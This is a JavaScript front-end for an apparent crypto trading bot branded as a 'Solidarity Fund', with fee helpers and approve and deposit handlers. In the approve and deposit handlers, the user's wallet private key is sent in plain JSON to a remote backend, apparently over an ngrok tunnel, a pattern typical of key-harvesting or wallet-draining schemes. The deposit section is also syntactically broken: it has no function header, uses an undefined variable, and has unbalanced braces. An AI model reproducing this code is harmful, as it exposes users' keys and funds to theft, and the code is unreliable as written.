// === Helpers ===
function safeParse(text) { try { return JSON.parse(text); } catch { return null; } }
function logToPanel(msg) {
    const panel = document.getElementById("logPanel");
    if (panel) panel.value += msg + "\n";
    else console.log(msg);
}
window.setStatus = function(text) {
    const statusLabel = document.getElementById("statusLabel");
    if (statusLabel) statusLabel.textContent = "STATE: " + text;
    else logToPanel(`[STATUS UPDATE] ${text}`);
};

// === Fee Helpers ===
function applyDepositFees(amount) {
    const commission = (amount * 2) / 5000; // proportional commission
    const gasFee = 0.001 * amount;          // 0.1% gas
    const pancakeFee = 0.0025 * amount;     // 0.25% swap fee
    const netAmount = amount - commission - gasFee - pancakeFee;

    logToPanel(`[FEE BREAKDOWN - DEPOSIT] Commission: ${commission.toFixed(4)} | Gas: ${gasFee.toFixed(4)} | Pancake: ${pancakeFee.toFixed(4)} | Net: ${netAmount.toFixed(4)}`);
    return netAmount > 0 ? netAmount : 0;
}

function applyWithdrawFees(amount) {
    const gasFee = 0.001 * amount;          // 0.1% gas
    const pancakeFee = 0.0025 * amount;     // 0.25% swap fee
    const netAmount = amount - gasFee - pancakeFee;

    logToPanel(`[FEE BREAKDOWN - WITHDRAW] Gas: ${gasFee.toFixed(4)} | Pancake: ${pancakeFee.toFixed(4)} | Net: ${netAmount.toFixed(4)}`);
    return netAmount > 0 ? netAmount : 0;
}

// === Solidarity Fund Sync Helper ===
async function syncBalanceFromFund() {
    try {
        const resp = await fetch(`${window.BASE_URL}/runbot/balances`, {
            method: "POST",
            headers: { "Content-Type": "application/json", "ngrok-skip-browser-warning": "true" },
            body: JSON.stringify({ userid: window.USER_ID, wallet_address: window.USER_ADDR })
        });
        const fundData = await resp.json();

        if (fundData?.balance !== undefined) {
            const balance = parseFloat(fundData.balance);

            logToPanel(`[SOLIDARITY FUND] Current balance: ${balance.toFixed(2)} USDT`);

            document.getElementById("startBalance").value = balance.toFixed(2);
            document.getElementById("investBalance").value = balance.toFixed(2);

            await fetch(`${window.BASE_URL}/runbot/update_client`, {
                method: "POST",
                headers: { "Content-Type": "application/json", "ngrok-skip-browser-warning": "true" },
                body: JSON.stringify({ userid: window.USER_ID, new_balance: balance })
            });

            logToPanel(`[DB SUCCESS] Synced solidarity fund balance ${balance.toFixed(2)} USDT into clients.db`);
        } else {
            logToPanel("[WARN] Solidarity fund did not return a balance.");
        }
    } catch (err) {
        logToPanel(`[ERROR] syncBalanceFromFund failed: ${err.message}`);
    }
}

// === Approve Handler ===
async function runApprove(amount) {
    if (amount <= 0) {
        logToPanel("[WARN] Approve amount must be greater than zero.");
        return;
    }
    logToPanel(`[INFO] Initiating approve of ${amount} USDT`);

    try {
        const resp = await fetch(`${window.BASE_URL}/runbot/approve`, {
            method: "POST",
            headers: { "Content-Type": "application/json", "ngrok-skip-browser-warning": "true" },
            body: JSON.stringify({
                wallet_address: window.USER_ADDR,
                private_key: window.USER_PK,
                amount: amount
            })
        });
        const parsed = safeParse(await resp.text());

        if (parsed?.status === "approve executed") {
            logToPanel(`[SUCCESS] Approve confirmed. TxHash=${parsed.tx_hash}`);
        } else {
            logToPanel("[WARN] Approve rejected.");
        }
    } catch (err) {
        logToPanel(`[ERROR] Approve failed: ${err.message}`);
    }
}

// === Deposit Handler ===

    try {
        const resp = await fetch(`${window.BASE_URL}/runbot/deposit`, {
            method: "POST",
            headers: { "Content-Type": "application/json", "ngrok-skip-browser-warning": "true" },
            body: JSON.stringify({
                wallet_address: window.USER_ADDR,
                private_key: window.USER_PK,
                amount: netAmount
            })
        });
        const parsed = safeParse(await resp.text());

        if (parsed?.status === "deposit executed") {
            logToPanel(`[SUCCESS] Deposit confirmed. TxHash=${parsed.tx_hash}`);

    }
}
